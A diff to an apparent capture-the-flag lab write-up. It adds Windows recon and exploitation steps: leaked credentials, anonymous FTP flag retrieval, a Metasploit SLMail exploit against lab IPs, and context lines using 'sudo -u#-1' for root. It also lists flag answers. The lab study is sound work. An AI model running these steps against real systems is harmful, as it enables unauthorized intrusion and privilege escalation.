@@ -132,7 +132,7 @@ dkkdudfkdy23
 ksdnd99dkas
 ```
 
-# Linux Scavenger Hunt
+# Linux Servers
 
 ## Reconnaissance
 
@@ -320,4 +320,121 @@ sudo -u#-1 find / -type f -iname "*flag*"
 sudo -u#-1 cat /root/flag12.txt
 
 d7sdfksdf384
+```
+
+# Windows Servers
+
+## Reconnaisance
+
+### Flag 1: 
+
+![image](https://github.com/user-attachments/assets/1fb6f1d4-6a88-4deb-b9dc-5acbe61a84fe)
+![image](https://github.com/user-attachments/assets/464deb2b-4c40-4ba8-8831-6a3917bbae2f)
+</br>
+```shell
+github.com/totalrekall
+
+site/xampp.users
+
+trivera: Tanya4life
+```
+
+### Flag 2: 
+
+![image](https://github.com/user-attachments/assets/863e1ed6-0b21-47ea-9c38-5f0e264ce375)
+![image](https://github.com/user-attachments/assets/a165e32f-93c7-459d-bec6-80aca3778f6b)
+</br>
+```shell
+http://172.22.117.20
+
+http://172.22.117.20/flag.txt
+
+4d7b349705784a518bc876bc2ed6d4f6
+```
+
+### Flag 3: 
+
+![image](https://github.com/user-attachments/assets/16da09de-87c7-44b7-a4d9-f3081f3df3bf)
+</br>
+```shell
+ftp 172.22.117.20
+
+Name: Anonymous
+Password:
+
+get flag3.txt
+
+exit
+
+cat flag3.txt
+
+89cb548970d44f348bb63622353ae278
+```
+
+## Exploitation
+
+### Flag 4: 
+
+![image](https://github.com/user-attachments/assets/b4e8dc4c-1814-4a8e-b888-cf13fbeacdc9)
+</br>
+```shell
+msfconsole
+
+search SLMail
+
+use 0
+
+set RHOSTS 172.22.117.20
+
+set LHOST 172.22.117.100
+
+run
+
+cat flag4.txt
+
+822e3434a10440ad9cc086197819b49d
+```
+
+## Post-Exploitation
+
+### Flag 5: 
+
+
+```shell
+
+```
+
+### Flag 6: 
+
+
+```shell
+
+```
+
+### Flag 7: 
+
+
+```shell
+
+```
+
+### Flag 8: 
+
+
+```shell
+
+```
+
+### Flag 9: 
+
+
+```shell
+
+```
+
+### Flag 10: 
+
+
+```shell
+
 ```
